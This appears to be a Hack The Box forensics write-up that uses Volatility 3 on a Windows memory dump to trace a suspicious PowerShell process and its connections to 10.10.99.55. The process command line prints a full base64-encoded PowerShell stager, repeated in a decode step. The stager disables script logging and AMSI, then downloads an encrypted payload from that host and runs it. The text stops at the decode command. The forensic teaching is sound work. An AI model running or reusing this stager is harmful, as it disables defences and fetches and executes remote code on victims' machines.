---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/209355489-9dc22e00-44a6-4aa3-a642-47bfbd5be517.png"> Reminiscent | Hack The Box | Forensics
date: 2023-04-12 00:00:02 +730
categories: [Write Up , HackTheBox]
tags: [windows-forensics, hackthebox, forensics-challenge] # TAG names should always be lowercase
---

>**Note:** Before you begin, majority of this writeup uses [volality3.0](https://github.com/volatilityfoundation/volatility3), so make sure you downloaded and have it setup on your system.*

### Setup
- First download the zip file and unzip the contents.
- We have a file `flounder-pc.memdump.elf` and another file `imageinfo.txt`.

*imageinfo.txt*
```text
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027fe0a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027ffd00L
                KPCR for CPU 1 : 0xfffff880009eb000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2017-10-04 18:07:30 UTC+0000
     Image local date and time : 2017-10-04 11:07:30 -0700
```

This file gives us the suggested profiles that we may need while running volatility. Let's choose the first profile: `Win7SP1x64`

### Running volatility3

You can run commands which uses plugins like `windows.info` to get to know more about your machine.

**Getting list of processes using `windows.pslist`**
- This plugin gives running processes on the machine at the time of the memory dump. Just like running `ps` on linux system.

```bash
$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.pslist
Volatility 3 Framework 1.0.0
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

4       0       System  0xfa80006b7040  83      477     N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
272     4       smss.exe        0xfa8001a63b30  2       30      N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
348     328     csrss.exe       0xfa800169bb30  9       416     0       False   2017-10-04 18:04:29.000000      N/A     Disabled
376     328     wininit.exe     0xfa8001f63b30  3       77      0       False   2017-10-04 18:04:29.000000      N/A     Disabled
396     384     csrss.exe       0xfa8001efa500  9       283     1       False   2017-10-04 18:04:29.000000      N/A     Disabled
432     384     winlogon.exe    0xfa8001f966d0  4       112     1       False   2017-10-04 18:04:29.000000      N/A     Disabled
476     376     services.exe    0xfa8001fcdb30  11      201     0       False   2017-10-04 18:04:29.000000      N/A     Disabled
492     376     lsass.exe       0xfa8001ff2b30  8       590     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
500     376     lsm.exe 0xfa8001fffb30  11      150     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
600     476     svchost.exe     0xfa8002001b30  12      360     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
664     476     VBoxService.ex  0xfa800209bb30  12      118     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
728     476     svchost.exe     0xfa80020b5b30  7       270     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
792     476     svchost.exe     0xfa80021044a0  21      443     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
868     476     svchost.exe     0xfa8002166b30  21      429     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
900     476     svchost.exe     0xfa800217cb30  41      977     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
988     476     svchost.exe     0xfa80021ccb30  13      286     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
384     476     svchost.exe     0xfa8002204960  17      386     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
1052    476     spoolsv.exe     0xfa8002294b30  13      277     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1092    476     svchost.exe     0xfa80022bbb30  19      321     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1196    476     svchost.exe     0xfa8002390620  28      333     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1720    476     taskhost.exe    0xfa8002245060  8       148     1       False   2017-10-04 18:04:36.000000      N/A     Disabled
1840    476     sppsvc.exe      0xfa8002122060  4       145     0       False   2017-10-04 18:04:37.000000      N/A     Disabled
2020    868     dwm.exe 0xfa80022c8060  4       72      1       False   2017-10-04 18:04:41.000000      N/A     Disabled
2044    2012    explorer.exe    0xfa80020bb630  36      926     1       False   2017-10-04 18:04:41.000000      N/A     Disabled
1476    2044    VBoxTray.exe    0xfa80022622e0  13      146     1       False   2017-10-04 18:04:42.000000      N/A     Disabled
1704    476     SearchIndexer.  0xfa80021b4060  16      734     0       False   2017-10-04 18:04:47.000000      N/A     Disabled
812     1704    SearchFilterHo  0xfa80023ed550  4       92      0       False   2017-10-04 18:04:48.000000      N/A     Disabled
1960    1704    SearchProtocol  0xfa80024f4b30  6       311     0       False   2017-10-04 18:04:48.000000      N/A     Disabled
2812    2044    thunderbird.ex  0xfa80007e0b30  50      534     1       True    2017-10-04 18:06:24.000000      N/A     Disabled
2924    600     WmiPrvSE.exe    0xfa8000801b30  10      204     0       False   2017-10-04 18:06:26.000000      N/A     Disabled
2120    476     svchost.exe     0xfa8000945060  12      335     0       False   2017-10-04 18:06:32.000000      N/A     Disabled
2248    476     wmpnetwk.exe    0xfa800096eb30  18      489     0       False   2017-10-04 18:06:33.000000      N/A     Disabled
592     600     WmiPrvSE.exe    0xfa8000930b30  9       127     0       False   2017-10-04 18:06:35.000000      N/A     Disabled
496     2044    powershell.exe  0xfa800224e060  12      300     1       False   2017-10-04 18:06:58.000000      N/A     Disabled
2772    396     conhost.exe     0xfa8000e90060  2       55      1       False   2017-10-04 18:06:58.000000      N/A     Disabled
2752    496     powershell.exe  0xfa8000839060  20      396     1       False   2017-10-04 18:07:00.000000      N/A     Disabled
```

Lets jump to next suspicious process that is  `powershell.exe`  PID: 2752. 

**Getting live connections using `windows.netscan`**
- This plugin gives us the connections at the time of the memory dump. Just like running `netstat` command.

```bash
$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.netscan
Volatility 3 Framework 1.0.0
Progress:  100.00               PDB scanning finished
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0x1e069840      UDPv4   10.10.100.43    137     *       0               4       System  2017-10-04 18:04:31.000000
0x1e06a950      TCPv4   10.10.100.43    139     0.0.0.0 0       LISTENING       4       System  -
0x1e078670      TCPv4   0.0.0.0 5357    0.0.0.0 0       LISTENING       4       System  -
0x1e078670      TCPv6   ::      5357    ::      0       LISTENING       4       System  -
0x1e0a8ec0      UDPv4   0.0.0.0 60655   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000
0x1e0a8ec0      UDPv6   ::      60655   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000
0x1e0ac8a0      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       476     services.exe    -
0x1e0b0a50      UDPv4   0.0.0.0 60654   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000
0x1e0e08a0      TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  -
0x1e0e08a0      TCPv6   ::      445     ::      0       LISTENING       4       System  -
0x1e0f9010      UDPv4   0.0.0.0 5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e243b20      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       900     svchost.exe     -
0x1e27f980      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       900     svchost.exe     -
0x1e27f980      TCPv6   ::      49154   ::      0       LISTENING       900     svchost.exe     -
0x1e28f1a0      UDPv4   0.0.0.0 5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e28f1a0      UDPv6   ::      5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e2ec510      TCPv6   -       0       382b:ff01:80fa:ffff:a010:4502:80fa:ffff 0       CLOSED  384     svchost.exe     N/A
0x1e2f33f0      TCPv4   0.0.0.0 49157   0.0.0.0 0       LISTENING       492     lsass.exe       -
0x1e2fc460      UDPv4   127.0.0.1       54573   *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e391b30      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       476     services.exe    -
0x1e391b30      TCPv6   ::      49155   ::      0       LISTENING       476     services.exe    -
0x1e3c5da0      UDPv4   0.0.0.0 5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e3f7010      UDPv4   0.0.0.0 5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000
0x1e3f7010      UDPv6   ::      5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000
0x1e3fb010      UDPv4   0.0.0.0 0       *       0               384     svchost.exe     2017-10-04 18:04:33.000000
0x1e3fb010      UDPv6   ::      0       *       0               384     svchost.exe     2017-10-04 18:04:33.000000
0x1e47a730      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  -
0x1e4c1e60      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       728     svchost.exe     -
0x1e4c30a0      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       728     svchost.exe     -
0x1e4c30a0      TCPv6   ::      135     ::      0       LISTENING       728     svchost.exe     -
0x1e4d7e70      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       376     wininit.exe     -
0x1e4d7e70      TCPv6   ::      49152   ::      0       LISTENING       376     wininit.exe     -
0x1e517800      TCPv6   -       0       38cb:1702:80fa:ffff:38cb:1702:80fa:ffff 0       CLOSED  2248    wmpnetwk.exe    N/A
0x1e556820      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       792     svchost.exe     -
0x1e556820      TCPv6   ::      49153   ::      0       LISTENING       792     svchost.exe     -
0x1e5689e0      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       792     svchost.exe     -
0x1e5a3250      UDPv4   0.0.0.0 5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000
0x1e5cdef0      TCPv4   0.0.0.0 49157   0.0.0.0 0       LISTENING       492     lsass.exe       -
0x1e5cdef0      TCPv6   ::      49157   ::      0       LISTENING       492     lsass.exe       -
0x1e5fa480      UDPv4   127.0.0.1       1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e774a60      UDPv4   10.10.100.43    138     *       0               4       System  2017-10-04 18:04:31.000000
0x1e7d7a60      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  N/A
0x1e85e010      UDPv6   ::1     1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e8fb010      UDPv4   0.0.0.0 5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e8fb010      UDPv6   ::      5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e8ff010      UDPv4   10.10.100.43    1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e903b10      UDPv6   ::1     54572   *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e909010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1ec304b0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1ed592b0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1ee7cd20      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       376     wininit.exe     -
0x1eec14e0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1eec14e0      UDPv6   ::      3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1f1ea4f0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1f1ea4f0      UDPv6   ::      3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1f6c1010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1f6c1010      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1f6c2ec0      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1fc04010      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  N/A
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc15010      TCPv6   ::1     2869    ::1     49237   ESTABLISHED     4       System  N/A
0x1fc3d320      TCPv4   10.10.100.43    49247   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc769d0      TCPv4   127.0.0.1       49232   127.0.0.1       49231   ESTABLISHED     2812    thunderbird.ex  N/A
0x1fc76cf0      TCPv4   127.0.0.1       49231   127.0.0.1       49232   ESTABLISHED     2812    thunderbird.ex  N/A
0x1fc85010      UDPv6   fe80::6cee:b5c1:4a75:f04b       1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1fc8e680      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1fc8e680      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1fc99db0      TCPv4   0.0.0.0 554     0.0.0.0 0       LISTENING       2248    wmpnetwk.exe    -
0x1fcc2b80      TCPv4   0.0.0.0 2869    0.0.0.0 0       LISTENING       4       System  -
0x1fcc2b80      TCPv6   ::      2869    ::      0       LISTENING       4       System  -
0x1fcc8010      TCPv6   ::1     49237   ::1     2869    ESTABLISHED     2248    wmpnetwk.exe    N/A
0x1fcdbec0      UDPv4   0.0.0.0 0       *       0               664     VBoxService.ex  2017-10-04 18:06:56.000000
0x1fcf4940      TCPv4   10.10.100.43    49233   10.10.20.166    143     ESTABLISHED     2812    thunderbird.ex  N/A
0x1fd01780      TCPv4   0.0.0.0 10243   0.0.0.0 0       LISTENING       4       System  -
0x1fd01780      TCPv6   ::      10243   ::      0       LISTENING       4       System  -
0x1fd9a3e0      TCPv4   0.0.0.0 554     0.0.0.0 0       LISTENING       2248    wmpnetwk.exe    -
0x1fd9a3e0      TCPv6   ::      554     ::      0       LISTENING       2248    wmpnetwk.exe    -
0x1fdb3630      TCPv4   10.10.100.43    49236   10.10.20.166    143     ESTABLISHED     2812    thunderbird.ex  N/A
```

What stood out to me was these line:
```bash
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc3d320      TCPv4   10.10.100.43    49247   10.10.99.55     80      CLOSED  2752    powershell.exe  -
```

Even though these connections were closed, there are some alarming signs:
1. That there is `powershell.exe`, even though it might be benign, it is possible that this might be used for setting up reverse shell.
2. That there is communication with port "80" using `powershell.exe`. This stoods out because a normal user (who is not that techsavvy) won't use "powershell.exe" to communicate with a website.

Let's dump out the command that would've been used to call `powershell.exe` to investigate.

**Getting command run by using `windows.cmdline`**
- We can get all the commands that were used to run the process using the command: 
```bash
$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline
```
- But to only get the command of a particular process, we can use PID with `--pid` flag
```bash
$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline --pid 2752                                                                                                                                            2 ⨯
Volatility 3 Framework 1.0.0
Progress:  100.00               PDB scanning finished
PID     Process Args

2752    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

So `powershell.exe` is called with `-enc` command which uses base64 encoding.

On decoding this encoding:
```bash
$ echo -n JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA= |base64 -d

